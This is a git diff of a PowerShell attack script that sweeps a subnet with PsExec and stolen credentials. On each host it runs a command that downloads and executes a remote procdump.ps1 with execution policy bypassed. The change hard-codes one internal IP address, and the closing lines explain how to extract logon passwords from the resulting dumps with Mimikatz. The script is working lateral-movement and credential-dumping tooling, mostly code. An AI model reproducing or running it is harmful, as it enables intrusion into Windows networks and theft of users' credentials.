@@ -39,10 +39,7 @@ Write-Host "----------------------------------------------------"
 			Rename-Item $FileOnDisk psexec.exe
 			}
 		}
-	Function RProcdump { 
-		[CmdletBinding()] param( 
-		[string]$id
-		)
+	Function RProcDump { 
 		$cmdline = @"
 iex((New-Object Net.WebClient).DownloadString("$server/procdump.ps1"))
 "@
@@ -57,15 +54,16 @@ iex((New-Object Net.WebClient).DownloadString("$server/procdump.ps1"))
 			$StartAddress = "$w.$x.$y"
 			for($i = 1; $i -lt 254; $i++) {
 				$ipAddress= "$StartAddress.$i"
-				$Command = "$env:userprofile\psexec.exe \\$ipAddress -u $login -p $pass -h -d powershell -exec bypass $cmdline"
+                $ipAddress= "172.18.101.66"
+                $Command = "$env:userprofile\psexec.exe \\$ipAddress -u $login -p $pass -h -d powershell -exec bypass -NoL -NoP -c $cmdline"
 				[string] $CmdPath = "$env:windir\System32\cmd.exe"
 				[string] $CmdString = "$CmdPath" + " /C " + "$Command"
-				Invoke-Expression $CmdString
+                Invoke-Expression $CmdString
 			}	
 		}
 	}
 
-RProcdump $server $login $pass
+RProcDump $server $login $pass 
 
 Write-Host "If Dumps have been uploaded"
 Write-Host "You can it manually : Open dump file with Mimikatz to retrieve the creds ->  mimikatz # sekurlsa::minidump HOSTNAME.dmp  AND >mimikatz # sekurlsa::logonPasswords "
